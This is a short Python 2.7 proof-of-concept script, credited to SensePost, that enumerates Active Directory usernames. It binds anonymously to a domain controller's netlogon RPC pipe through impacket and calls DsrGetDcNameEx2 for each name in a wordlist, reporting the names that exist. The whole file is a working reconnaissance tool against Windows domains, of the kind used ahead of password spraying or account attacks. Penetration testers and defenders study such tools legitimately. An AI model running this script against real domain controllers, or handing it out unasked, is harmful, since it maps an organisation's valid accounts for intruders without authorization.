#!/usr/bin/python2.7

#https://github.com/CoreSecurity/impacket/blob/master/tests/SMB_RPC/test_nrpc.py
#msdn https://msdn.microsoft.com/en-us/library/cc237228.aspx
# NET_API_STATUS DsrGetDcNameEx2(
#   [in, unique, string] LOGONSRV_HANDLE ComputerName,
#   [in, unique, string] wchar_t* AccountName,
#   [in] ULONG AllowableAccountControlBits,
#   [in, unique, string] wchar_t* DomainName,
#   [in, unique] GUID* DomainGuid,
#   [in, unique, string] wchar_t* SiteName,
#   [in] ULONG Flags,
#   [out] PDOMAIN_CONTROLLER_INFOW* DomainControllerInfo
# );

import sys
from impacket.dcerpc.v5.samr import NULL
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.nrpc import MSRPC_UUID_NRPC, hDsrGetDcNameEx,hDsrGetDcNameEx2

if len(sys.argv)!=3:
	print("UserEnum RPC POC - Reino Mostert/SensePost 2018")
	print("Usage:   python UserEnum_RPC.py DomainControlerIP Userlist")
	print("Example: python UserEnum_RPC.py 192.168.1.10 userlist.txt")
	sys.exit()

creds={}
creds['username']=''
creds['password']=''
creds['domain']='WORKGROUP'
creds['lmhash']=''
creds['nthash']=''
creds['aesKey']=''
machineNameOrIp=sys.argv[1]

stringBinding = r'ncacn_np:%s[\pipe\netlogon]' % machineNameOrIp
rpctransport = transport.DCERPCTransportFactory(stringBinding)

if hasattr(rpctransport, 'set_credentials'):
	rpctransport.set_credentials(creds['username'], creds['password'], creds['domain'], creds['lmhash'],creds['nthash'], creds['aesKey'])

dce = rpctransport.get_dce_rpc()
print("[*] Connecting to %s" % machineNameOrIp)
dce.connect()
print("[*] DCE binding...")
dce.bind(MSRPC_UUID_NRPC)
print("[+] Connection and binding succeeded, ready to query")

f=open(sys.argv[2])
usernames=f.readlines();
f.close()

for user in usernames:
	try:
		user=user.rstrip();
		resp = hDsrGetDcNameEx2(dce,NULL,'%s\x00' %user, 512, NULL, NULL,NULL, 0)
		#resp.dump()
	except:
		pass
	else:
		print("[+] %s exists" %(user))
print("[*] Done ")
dce.disconnect()
